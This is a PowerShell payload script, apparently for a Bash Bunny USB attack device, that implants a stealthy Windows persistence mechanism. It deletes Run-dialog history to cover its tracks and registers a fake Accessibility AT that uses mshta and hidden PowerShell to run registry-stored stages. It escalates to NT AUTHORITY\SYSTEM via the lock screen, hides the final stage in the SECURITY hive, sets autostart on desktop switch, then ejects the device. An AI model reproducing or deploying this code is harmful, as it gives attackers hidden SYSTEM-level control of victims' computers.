#Remove latest run entry
$p = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"; $m = "MRUList"; $l=gpv $p $m; rp $p $l[0]; sp $p $m $l.Substring(1);

# Create AT to run next stage
$at = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs"
$atnt = $at+"\atnt"
New-Item -Path $at -Name "atnt" -Force
New-ItemProperty -Path $atnt -Name "CopySettingsToLockedDesktop" -Value 1 -PropertyType "DWord" -Force
New-ItemProperty -Path $atnt -Name "SimpleProfile" -Value "atnt" -PropertyType "String" -Force
New-ItemProperty -Path $atnt -Name "StartExe" -Value "%SystemRoot%\System32\mshta.exe" -PropertyType "ExpandString" -Force
New-ItemProperty -Path $atnt -Name "StartParams" -Value ("vbscript:(CreateObject(""WScript.Shell"").Run(""powershell -w 1 -NoP ([WmiClass]'Win32_Process').Create('powershell -w 1 -NoP iex(gpv HKLM:\SOFTWARE\Microsoft\Windows`` NT\CurrentVersion\Accessibility\ATs\atnt 0)')"",0)(Window.Close))") -PropertyType "String" -Force

# The value of this is ran when the AT is launched.
# If the AT is launched with user privilages, lock the workstation. This trigger the AT to be launched a second time as NT AUTHORITY/SYSTEM.
# When launched as NT AUTHORITY/SYSTEM, the next stage is retrieved from the registry and ran.
New-ItemProperty -Path $atnt -Name "0" -Value @"
if((whoami) -ne 'NT AUTHORITY\SYSTEM'){<#LI#>exit;}
iex(gpv HKLM:\SOFTWARE\Microsoft\Windows`` NT\CurrentVersion\Accessibility\ATs\atnt 1)
"@

# The value of this is ran when the AT is launched with NT AUTHORITY/SYSTEM rights.
# Uses Set-Alias and short variable names to fit payload in a single registry entry.
New-ItemProperty -Path $atnt -Name "1" -Value @"
`$a = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\atnt";
`$p = gpv `$a 2;
sal nip New-ItemProperty;
sal rip Remove-ItemProperty;
ni -Path "HKLM:\SECURITY\Policy" -Name PolAtnt -Force;
nip -Path "HKLM:\SECURITY\Policy\PolAtnt" -Name "1" -Value `$p -PropertyType "string" -Force;
nip -Path `$a -Name "StartParams" -Value "vbscript:(CreateObject(""WScript.Shell"").Run(""powershell -w 1 -NoP if((whoami) -ne 'NT AUTHORITY\SYSTEM'){exit};([WmiClass]'Win32_Process').Create('powershell -w 1 -NoP iex(gpv HKLM:\SECURITY\Policy\PolAtnt 1)')"",0)(Window.Close))" -PropertyType "String" -Force;
rip -Path `$a -Name "2" -Force;
rip -Path `$a -Name "1" -Force;
rip -Path `$a -Name "0" -Force;
#RI#
"@

# The final stage is later written to the SECURITY hive, this hive is only visible by NT AUTHORITY/SYSTEM.
New-ItemProperty -Path $atnt -Name "2" -Value @"
!FINAL_STAGE!

"@


#Add the newly created AT to automatically start on a desktop switch.
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility" -Name "Configuration" -Value "atnt" -PropertyType "String" -Force;

#Let the Bash Bunny know we're done here & Eject.
$bb = (gwmi win32_volume -f 'label=''BashBunny''').Name;
New-Item -ItemType file $bb"DONE";
(New-Object -comObject Shell.Application).Namespace(17).ParseName($bb).InvokeVerb("Eject");

#FL#
